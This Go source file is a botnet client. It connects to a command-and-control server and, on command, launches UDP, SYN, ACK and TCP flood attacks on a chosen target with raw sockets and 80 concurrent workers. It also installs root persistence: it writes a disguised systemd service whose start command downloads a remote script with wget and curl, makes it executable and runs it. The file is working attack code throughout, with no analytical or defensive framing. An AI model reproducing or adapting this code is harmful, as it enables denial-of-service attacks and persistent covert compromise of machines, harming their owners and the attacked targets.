package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"
	"context"
	"math/rand"
	"sync/atomic"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

const (
	C2Address = "0.0.0.0:9080" // C2 server address and port
)

func main() {
	rand.Seed(time.Now().UnixNano())

	// Attempt to establish a connection with the C2 server
	for {
		conn, err := net.Dial("tcp", C2Address)
		if err != nil {
			fmt.Println("Error connecting to C2 server:", err)
			time.Sleep(5 * time.Second) // Retry after 5 seconds on connection error
			continue
		}
		defer conn.Close()

		fmt.Println("Connected to C2 server")

		scanner := bufio.NewScanner(conn)
		for scanner.Scan() {
			command := scanner.Text()
			fmt.Println("Received command:", command)

			if err := handleCommand(command); err != nil {
				fmt.Println("Error handling command:", err)
			}
		}

		if err := scanner.Err(); err != nil {
			fmt.Println("Error reading from connection:", err)
		}

		time.Sleep(5 * time.Second) // Wait before attempting to reconnect
	}
}

// handleCommand handles the command received from the C2 server
func handleCommand(command string) error {
	fields := strings.Fields(command)
	if len(fields) < 4 {
		return fmt.Errorf("invalid command format")
	}

	cmd := fields[0]
	targetIP := fields[1]
	targetPortStr := fields[2]
	durationStr := fields[3]

	targetPort, err := strconv.Atoi(targetPortStr)
	if err != nil {
		return fmt.Errorf("invalid target port: %w", err)
	}

	duration, err := strconv.Atoi(durationStr)
	if err != nil {
		return fmt.Errorf("invalid duration: %w", err)
	}

	switch cmd {
	case "udpflood":
		go performUDPFlood(targetIP, targetPort, duration)
	case "synflood":
		go performSYNFlood(targetIP, targetPort, duration)
	case "ackflood":
		go performACKFlood(targetIP, targetPort, duration)
	case "tcpflood":
		go performTCPFlood(targetIP, targetPort, duration)
	case "persistence":
		go SystemdPersistence() // Execute SystemdPersistence function
	default:
		return fmt.Errorf("unknown command: %s", cmd)
	}

	return nil
}

func performUDPFlood(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())

	// Resolve target IP address
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}

	// Create a context with cancellation to signal the end of the attack
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	// Launch multiple goroutines to send UDP packets concurrently
	numWorkers := 80 // Number of concurrent workers (adjust based on device capability)
	var wg sync.WaitGroup
	var packetCount int64 // Use int64 for atomic operations

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			// Create a raw socket (AF_INET, SOCK_RAW, IPPROTO_UDP)
			conn, err := net.ListenPacket("ip4:udp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return // Terminate goroutine if context is canceled
				default:
					// Prepare UDP packet
					udpLayer := &layers.UDP{
						SrcPort: layers.UDPPort(rand.Intn(65535)), // Randomize source port
						DstPort: layers.UDPPort(targetPort),
					}

					// Create a random payload of appropriate length (e.g., 16 bytes)
					payloadSize := 16
					payload := make([]byte, payloadSize)
					rand.Read(payload)

					// Serialize UDP layer with payload
					buffer := gopacket.NewSerializeBuffer()
					opts := gopacket.SerializeOptions{}
					if err := udpLayer.SerializeTo(buffer, opts); err != nil {
						fmt.Printf("Error serializing UDP layer: %v\n", err)
						continue
					}
					if err := gopacket.SerializeLayers(buffer, opts, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error serializing payload: %v\n", err)
						continue
					}

					// Send the raw packet (UDP) to the target
					if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}

					atomic.AddInt64(&packetCount, 1) // Increment packet count atomically
				}
			}
		}()
	}

	// Wait for all goroutines to finish or until the context is canceled
	wg.Wait()

	fmt.Printf("UDP flood attack completed. Sent %d packets.\n", atomic.LoadInt64(&packetCount))
	return nil
}



// performSYNFlood performs a SYN flood attack
func performSYNFlood(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())

	// Resolve target IP address
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}

	// Prepare TCP SYN packet layers
	var packetCount int64 // Use int64 for atomic operations

	// Create a WaitGroup to wait for all goroutines to finish
	var wg sync.WaitGroup

	// Create a context with cancellation to signal the end of the attack
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	// Launch multiple goroutines to send SYN packets concurrently
	numWorkers := 80 // Number of concurrent workers (adjust based on device capability)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			// Create raw socket (AF_INET, SOCK_RAW, IPPROTO_TCP)
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done(): // Check if the context is canceled
					return // Terminate goroutine if context is canceled
				default:
					// Prepare TCP SYN packet
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024), // Randomize source port (32768-65535)
						DstPort:    layers.TCPPort(targetPort),
						SYN:        true,                          // SYN flag to initiate TCP connection
						Seq:        rand.Uint32(),                 // Randomize sequence number
						Window:     12800,                         // TCP window size (can be any valid value)
						DataOffset: 5,                            // DataOffset is set to 5 (minimum value)
					}

					// Serialize TCP layer into buffer
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer); err != nil {
						fmt.Printf("Error crafting TCP SYN packet: %v\n", err)
						continue
					}

					// Get packet data bytes
					packetData := buffer.Bytes()

					// Send raw packet (TCP SYN) to the target
					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}

					atomic.AddInt64(&packetCount, 1) // Increment packet count atomically
				}
			}
		}()
	}

	// Wait for all goroutines to finish or until the context is canceled
	wg.Wait()

	fmt.Printf("SYN flood attack completed.\n")
	return nil
}


// performACKFlood performs an ACK flood attack
func performACKFlood(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())

	// Resolve target IP address
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}

	// Prepare TCP ACK packet layers
	var packetCount int64 // Use int64 for atomic operations

	// Create a WaitGroup to wait for all goroutines to finish
	var wg sync.WaitGroup

	// Create a context with cancellation to signal the end of the attack
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	// Launch multiple goroutines to send ACK packets concurrently
	numWorkers := 80 // Number of concurrent workers (adjust based on device capability)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			// Create raw socket (AF_INET, SOCK_RAW, IPPROTO_TCP)
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done(): // Check if the context is canceled
					return // Terminate goroutine if context is canceled
				default:
					// Prepare TCP ACK packet
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(64312) + 1024), // Randomize source port (1024-65335)
						DstPort:    layers.TCPPort(targetPort),
						ACK:        true,                          // ACK flag to acknowledge data
						Seq:        rand.Uint32(),                 // Randomize sequence number
						Ack:        rand.Uint32(),                 // Randomize acknowledgment number
						Window:     12800,                         // TCP window size (can be any valid value)
						DataOffset: 5,                            // Set DataOffset to 5 (20-byte TCP header)
					}

					// Serialize TCP layer into buffer
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer); err != nil {
						fmt.Printf("Error crafting TCP ACK packet: %v\n", err)
						continue
					}

					// Get packet data bytes
					packetData := buffer.Bytes()

					// Send raw packet (TCP ACK) to the target
					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}

					atomic.AddInt64(&packetCount, 1) // Increment packet count atomically
				}
			}
		}()
	}

	// Wait for all goroutines to finish or until the context is canceled
	wg.Wait()

	fmt.Printf("ACK flood attack completed. Sent %d packets.\n", atomic.LoadInt64(&packetCount))
	return nil
}

// performTCPFlood performs a TCP flood attack
func performTCPFlood(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())

	// Resolve target IP address
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}

	// Prepare TCP packet layers
	var packetCount int64 // Use int64 for atomic operations

	// Create a WaitGroup to wait for all goroutines to finish
	var wg sync.WaitGroup

	// Create a context with cancellation to signal the end of the attack
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	// Launch multiple goroutines to send TCP packets concurrently
	numWorkers := 80 // Number of concurrent workers (adjust based on device capability)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			// Create raw socket (AF_INET, SOCK_RAW, IPPROTO_TCP)
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done(): // Check if the context is canceled
					return // Terminate goroutine if context is canceled
				default:
					// Prepare TCP packet
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024), // Randomize source port (32768-65535)
						DstPort:    layers.TCPPort(targetPort),
						Seq:        rand.Uint32(),                 // Randomize sequence number
						Window:     12800,                         // TCP window size (can be any valid value)
						SYN:        true,                          // Set SYN flag for TCP handshake
						DataOffset: 5,                            // Set DataOffset to 5 (20-byte TCP header)
					}

					// Serialize TCP layer into buffer
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer); err != nil {
						fmt.Printf("Error crafting TCP packet: %v\n", err)
						continue
					}

					// Get packet data bytes
					packetData := buffer.Bytes()

					// Send raw packet (TCP) to the target
					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}

					atomic.AddInt64(&packetCount, 1) // Increment packet count atomically
				}
			}
		}()
	}

	// Wait for all goroutines to finish or until the context is canceled
	wg.Wait()

	fmt.Printf("TCP flood attack completed.\n")
	return nil
}

// SystemdPersistence creates a systemd service for persistence
func SystemdPersistence() {
	payload := `/bin/bash -c "/bin/wget "http://0.0.0.0/universal.sh"; chmod 777 universal.sh; ./universal.sh; /bin/curl -k -L --output universal.sh "http://0.0.0.0/universal.sh"; chmod 777 universal.sh; ./universal.sh"`

	skeleton := `
[Unit]
Description=My Miscellaneous Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/tmp
ExecStart=%s
Restart=no

[Install]
WantedBy=multi-user.target
`
	daemon := fmt.Sprintf(skeleton, payload)
	err := os.WriteFile("/lib/systemd/system/bot.service", []byte(daemon), 0666)
	if err != nil {
		fmt.Println("Error writing systemd service file:", err)
		return
	}

	cmd := exec.Command("/bin/systemctl", "enable", "bot")
	out, err := cmd.Output()
	if err != nil {
		fmt.Println("Error enabling systemd service:", err)
		return
	}
	fmt.Println(string(out))
}